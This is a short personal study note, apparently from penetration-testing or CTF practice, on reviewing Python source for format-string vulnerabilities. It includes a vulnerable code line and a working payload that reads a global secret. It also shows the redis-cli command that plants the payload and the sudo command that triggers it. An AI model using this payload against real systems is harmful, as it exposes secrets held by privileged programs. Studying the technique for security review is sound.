---
creation date: May 19th 2023
last modified date: May 19th 2023
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Python Source Code Review]]  
___

## Description:  

### Eval


### Format String Exploit
https://podalirius.net/en/articles/python-format-string-vulnerabilities/

Look for curly brackets in source code:
```
license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
```
you need to use the correct class (not self like in the link above).

In this specific example, the script was pulling from a redis database, so the exploit was set there with `{license.__init__.__globals__[secret]}`:

```
/usr/bin/redis-cli -s /var/run/redis/redis.sock HSET test username "{license.__init__.__globals__[secret]}"

sudo /usr/bin/license -p test
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: May 19th 2023 (09:53 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
